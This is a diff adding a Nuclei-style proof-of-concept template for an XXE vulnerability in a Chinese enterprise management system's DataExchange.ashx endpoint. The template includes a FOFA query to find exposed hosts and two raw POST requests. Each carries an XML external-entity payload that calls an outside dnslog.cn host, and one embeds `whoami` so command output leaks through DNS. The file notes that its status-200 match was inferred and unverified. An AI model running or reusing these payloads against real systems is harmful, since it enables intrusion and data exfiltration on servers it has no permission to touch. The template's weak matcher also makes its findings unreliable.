@@ -1,0 +1,28 @@
+id: poc-wzggmp57vsz99pwg
+info:
+  name: 某联达企业管理系统-Data.ashx文件存在-XXE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wzggmp57vsz99pwg
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wzggmp57vsz99pwg
+    fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+http:
+- raw:
+  - "POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1\nHost: {{Hostname}}\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36\nSec-Purpose: prefetch;prerender\nPurpose: prefetch\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Length: 405\n\n------WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Disposition: form-data;name=\"SystemName\"\n\nBIM\n------WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Disposition: form-data;name=\"Params\"\nContent-Type: text/plain\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n    <!ENTITY t SYSTEM \"http://`whoami`.ew1sda.dnslog.cn/\">\n    ]\n>\n<test>&t;</test>\n------WebKitFormBoundaryJGgV5l5ta05yAIe0--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1\nHost: {{Hostname}}\naccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: GTP_IdServer_LangID=2052\nConnection: close\nContent-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Length: 397\n\n------WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Disposition: form-data;name=\"SystemName\"\n\nBIM\n------WebKitFormBoundaryJGgV5l5ta05yAIe0\nContent-Disposition: form-data;name=\"Params\"\nContent-Type: text/plain\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n    <!ENTITY t SYSTEM \"https://sdffiu.dnslog.cn/\">\n    ]\n>\n<test>&t;</test>\n------WebKitFormBoundaryJGgV5l5ta05yAIe0--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
